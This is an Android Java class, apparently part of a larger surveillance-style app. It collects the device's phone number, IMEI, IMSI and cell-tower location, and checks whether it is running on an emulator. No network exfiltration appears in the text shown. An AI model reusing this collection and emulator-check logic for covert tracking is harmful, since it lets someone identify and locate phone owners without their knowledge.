/* *********************************************
 * Create by : Alberto "Q" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 06-dec-2010
 **********************************************/
package com.lfish.control.action.actiontool;
import com.lfish.control.ControlApplication;
import android.content.Context;
import android.os.Build;
import android.provider.Settings.Secure;
import android.telephony.CellLocation;
import android.telephony.PhoneNumberUtils;
import android.telephony.TelephonyManager;
import android.telephony.cdma.CdmaCellLocation;
import android.telephony.gsm.GsmCellLocation;

// TODO: Auto-generated Javadoc
/**
 * The Class Device.
 */
public class Device {
	private static final String TAG = "Device"; 

	public static final String UNKNOWN_NUMBER = "";

	/** The singleton. */
	private volatile static Device singleton;
	private String sdk = "sdk";

	/**
	 * Self.
	 * 
	 * @return the device
	 */
	public static Device self() {
		if (singleton == null) {
			synchronized (Device.class) {
				if (singleton == null) {
					singleton = new Device();
				}
			}
		}

		return singleton;
	}

	/**
	 * Gets the phone number.
	 * 
	 * @return the phone number
	 */
	public String getPhoneNumber() {
		try {
			TelephonyManager mTelephonyMgr;
			
			mTelephonyMgr = (TelephonyManager) ControlApplication.context.getSystemService(Context.TELEPHONY_SERVICE);

			String number = mTelephonyMgr.getLine1Number();
			if (isPhoneNumber(number) ) {
				return number;
			}
		} catch (Exception ex) {
			
		}

		return UNKNOWN_NUMBER;
	}

	private boolean isPhoneNumber(String number) {
		if(number == null || number.length() == 0) {
			return false;
		}

		return PhoneNumberUtils.isGlobalPhoneNumber(number);
	}

	/**
	 * Gets the version.
	 * 
	 * @return the version
	 */
	public byte[] getVersion() {
		
		final byte[] versionRet = ByteArray.intToByteArray(1);

//		if (Cfg.DEBUG) {
//			Check.ensures(versionRet.length == 4, "Wrong version len"); 
//		}
		return versionRet;
	}

	/**
	 * Check. if is CDMA. 
	 * 
	 * @return true, if is CDMA
	 */
	public static boolean isCdma() {
		return false;
	}

	public static boolean isGprs() {
		return true;
	}

	public boolean isSimulator() {
		// return getDeviceId() == "9774d56d682e549c";
		return Build.PRODUCT.startsWith(sdk); 
	}

	/**
	 * Gets the imei.
	 * 
	 * @return the imei
	 */
	public String getImei() {
		final TelephonyManager telephonyManager;

		try {
			telephonyManager = (TelephonyManager) ControlApplication.context.getSystemService(Context.TELEPHONY_SERVICE);
		} catch (Exception ex) {
//			if (Cfg.DEBUG) {
//				Check.log(TAG + " (getImei) Error: " + ex);
//			}

			return "";
		}

		String imei = telephonyManager.getDeviceId();

//		if (imei == null || imei.length() == 0) {
//			imei = Secure.getString(EMChat.getInstance().getAppContext().getContentResolver(), Secure.ANDROID_ID);
//			if (imei == null || imei.length() == 0) {
//				imei = M.e("N/A"); 
//			}
//		}

		return imei;
	}

	/**
	 * Gets the imsi.
	 * 
	 * @return the imsi
	 */
	public String getImsi() {
		final TelephonyManager telephonyManager;

		try {
			telephonyManager = (TelephonyManager) ControlApplication.context.getSystemService(Context.TELEPHONY_SERVICE);
		} catch (Exception ex) {
//			if (Cfg.DEBUG) {
//				Check.log(TAG + " (getImei) Error: " + ex);
//			}

			return "";
		}

		String imsi = telephonyManager.getSubscriberId();

		if (imsi == null) {
			imsi = "UNAVAILABLE";
		}

		return imsi;
	}

	public static CellInfo getCellInfo() {
		final android.content.res.Configuration conf = ControlApplication.context.getResources().getConfiguration();
		final TelephonyManager tm;

		final CellInfo info = new CellInfo();

		try {
			tm = (TelephonyManager) ControlApplication.context.getSystemService(Context.TELEPHONY_SERVICE);
		} catch (Exception ex) {
//			if (Cfg.DEBUG) {
//				Check.log(TAG + " (getImei) Error: " + ex);
//			}

			return info;
		}

		if (tm.getSimState() == TelephonyManager.SIM_STATE_ABSENT) {
//			if (Cfg.DEBUG) {
//				Check.log(TAG + " (getCellInfo): no sim");
//			}
			return info;
		} 

		final CellLocation bcell = tm.getCellLocation();

		if (bcell == null) {
//			if (Cfg.DEBUG) {
//				Check.log(TAG + M.e(" Error: ") + M.e("null cell"));  //$NON-NLS-2$
//			}

			return info;
		}

		final int rssi = 0; // TODO aggiungere RSSI

		if (bcell instanceof GsmCellLocation) {
//			if (Cfg.DEBUG) {
//				Check.asserts(Device.isGprs(), M.e("gprs or not?")); 
//			}
			final GsmCellLocation cell = (GsmCellLocation) bcell;

			info.setGsm(conf.mcc, conf.mnc, cell.getLac(), cell.getCid(), rssi);

//			if (Cfg.DEBUG) {
//				Check.log(TAG + M.e(" info: ") + info.toString()); 
//			}

		}

		if (bcell instanceof CdmaCellLocation) {
//			if (Cfg.DEBUG) {
//				Check.asserts(Device.isCdma(), M.e("cdma or not?")); 
//			}
			final CdmaCellLocation cell = (CdmaCellLocation) tm.getCellLocation();

			info.setCdma(cell.getSystemId(), cell.getNetworkId(), cell.getBaseStationId(), rssi);
			info.cdma = true;
			info.valid = true;

			info.sid = cell.getSystemId();
			info.nid = cell.getNetworkId();
			info.bid = cell.getBaseStationId();

//			if (Cfg.DEBUG) {
//				Check.log(TAG + M.e(" info: ") + info.toString()); 
//			}

		}

		return info;
	}

}
